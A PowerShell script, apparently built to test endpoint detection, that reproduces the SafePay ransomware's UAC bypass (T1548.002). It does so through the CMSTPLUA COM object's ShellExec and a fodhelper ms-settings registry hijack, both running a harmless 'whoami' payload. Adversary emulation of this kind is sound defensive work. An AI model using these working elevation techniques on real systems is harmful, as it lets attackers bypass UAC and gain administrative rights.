<#
.SYNOPSIS
    SafePay UAC Bypass via CMSTPLUA - DETECTION TRIGGER
.DESCRIPTION
    Attempts UAC bypass using CMSTPLUA COM object.
    TTP: T1548.002
#>
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting SafePay UAC Bypass (T1548.002)" -ForegroundColor Cyan

# Step 1: Check current integrity level
Write-Host "`n[*] Checking current integrity level..."
Write-Host "    CMD: whoami /groups | findstr Integrity"
$integrity = whoami /groups 2>&1 | Select-String "Integrity"
Write-Host "    [*] $($integrity)" -ForegroundColor Yellow

# Step 2: Attempt CMSTPLUA COM object UAC bypass
Write-Host "`n[*] [T1548.002] Attempting CMSTPLUA COM UAC bypass..."
Write-Host "    Using CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
try {
    $cmstpluaCLSID = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
    
    # This COM instantiation will trigger EDR regardless of success
    $type = [Type]::GetTypeFromCLSID([Guid]$cmstpluaCLSID)
    $instance = [Activator]::CreateInstance($type)
    
    if ($instance) {
        Write-Host "    [+] CMSTPLUA COM object instantiated (UAC bypass possible)" -ForegroundColor Green
        
        # Attempt to invoke elevated process
        $instance.GetType().InvokeMember("ShellExec", [Reflection.BindingFlags]::InvokeMethod, $null, $instance, @("cmd.exe", "/c whoami > C:\temp\uac_test.txt", "", "runas", 0))
        Write-Host "    [+] Elevated command executed" -ForegroundColor Green
    }
} catch {
    Write-Host "    [-] CMSTPLUA bypass failed: $_" -ForegroundColor Red
    Write-Host "    [*] This is expected - detection still triggers from COM access attempt" -ForegroundColor Yellow
}

# Step 3: Alternative UAC bypass via fodhelper
Write-Host "`n[*] [T1548.002] Attempting fodhelper UAC bypass..."
Write-Host "    CMD: Setting HKCU:\Software\Classes\ms-settings\shell\open\command"
try {
    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe /c whoami > C:\temp\fodhelper_test.txt" -Force
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
    Write-Host "    [+] Registry hijack set" -ForegroundColor Green
    
    # Execute fodhelper (triggers UAC bypass detection)
    Write-Host "    CMD: Start-Process fodhelper.exe"
    Start-Process "fodhelper.exe" -ErrorAction Stop
    Start-Sleep -Seconds 3
    
    # Cleanup
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "    [+] Registry cleaned up" -ForegroundColor Green
} catch {
    Write-Host "    [-] fodhelper bypass failed: $_" -ForegroundColor Red
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "`n[+] UAC Bypass Simulation Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: CMSTPLUA COM access, fodhelper registry hijack, UAC bypass attempt" -ForegroundColor Magenta
